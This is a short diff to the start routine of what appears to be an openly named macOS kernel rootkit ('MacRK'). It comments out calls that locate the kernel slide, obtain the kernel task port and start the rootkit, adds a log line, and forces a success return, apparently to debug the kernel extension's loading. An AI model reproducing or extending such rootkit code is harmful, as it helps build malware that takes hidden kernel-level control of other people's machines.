@@ -31,23 +31,25 @@ void IOKernelRootKitService::free()
 
 bool IOKernelRootKitService::start(IOService *provider)
 {
-	kern_return_t ret = kIOReturnUnsupported;
+	kern_return_t ret = kIOReturnSuccess;
 
 	mach_vm_address_t kernel_base = Kernel::findKernelBase();
 
-	off_t kernel_slide = Kernel::findKernelSlide();
+	MAC_RK_LOG("MacRK::START KERNEL EXTENSION!\n");
 
-	this->kernel = new Kernel(kernel_base, kernel_slide);
+	// off_t kernel_slide = Kernel::findKernelSlide();
 
-	this->kernel->setRootKitService(this);
+	// this->kernel = new Kernel(kernel_base, kernel_slide);
 
-	this->tfp0 = this->kernel->getKernelTaskPort();
+	// this->kernel->setRootKitService(this);
 
-	ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
+	// this->tfp0 = this->kernel->getKernelTaskPort();
+
+	// ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
 
 	if(ret == kIOReturnSuccess)
 	{
-		this->rootkit = mac_rootkit_get_rootkit();
+		// this->rootkit = mac_rootkit_get_rootkit();
 
 		registerService();
 	}
